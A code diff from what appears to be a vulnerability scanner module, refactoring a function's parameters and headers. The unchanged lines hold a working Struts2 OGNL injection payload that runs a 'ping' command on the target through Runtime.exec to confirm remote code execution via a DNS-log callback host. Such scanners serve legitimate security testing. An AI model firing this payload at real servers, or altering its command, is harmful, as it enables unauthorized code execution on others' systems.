@@ -30,7 +30,7 @@ class UrlProcessing:  # URL处理函数
             res = urllib.parse.urlparse('http://%s' % url)
         return res.scheme, res.hostname, res.port,res.path
 
-def medusa(Url,RandomAgent,proxies=None,**kwargs):
+def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
     proxies=Proxies().result(proxies)
 
     scheme, url, port,path = UrlProcessing().result(Url)
@@ -44,13 +44,9 @@ def medusa(Url,RandomAgent,proxies=None,**kwargs):
     payload="""?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22ping%20{}%22%29)""".format(DL.dns_host())
     try:
         payload_url = scheme + "://" + url +":"+ str(port)+path+payload
-        headers = {
-            'User-Agent': RandomAgent,
-            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-            "Accept-Encoding": "gzip, deflate",
-        }
 
-        resp = requests.get(payload_url,headers=headers, timeout=6,proxies=proxies, verify=False)
+
+        resp = requests.get(payload_url,headers=Headers, timeout=6,proxies=proxies, verify=False)
         con = resp.text
         time.sleep(3)
         if DL.result():
